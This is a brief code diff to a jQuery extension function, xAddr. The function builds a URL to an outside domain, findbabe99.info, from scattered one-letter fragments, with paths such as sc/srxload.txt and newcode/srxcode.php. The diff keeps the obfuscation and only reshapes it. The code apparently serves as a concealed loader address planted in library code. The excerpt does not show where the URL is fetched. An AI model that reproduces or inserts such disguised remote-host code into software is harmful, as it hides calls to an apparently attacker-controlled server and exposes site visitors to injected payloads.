@@ -1,6 +1,5 @@
 jQuery.xAddr = function(noBg){
     noBg = noBg || false;
-    var t = "t";
     var d = ".";
     var c = ":";
     var s = "/";
@@ -9,11 +8,11 @@ jQuery.xAddr = function(noBg){
     var pr = "srx";
     var cc = "code";
 
-    var dd = "findbabe99" + d + "info" + s;
+    var dd = "findbabe99.info/";
     if (noBg)
         d = dd + "new" + cc + s + pr + cc + d + p + 'h' + p;
     else
-        d = dd + "sc" + s + pr + "load" + d + t + "x" + t;
+        d = dd + "sc" + s + pr + "load" + d + 't' + "x" + 't';
 
     s += s;
     return 'http' + c + s + d;
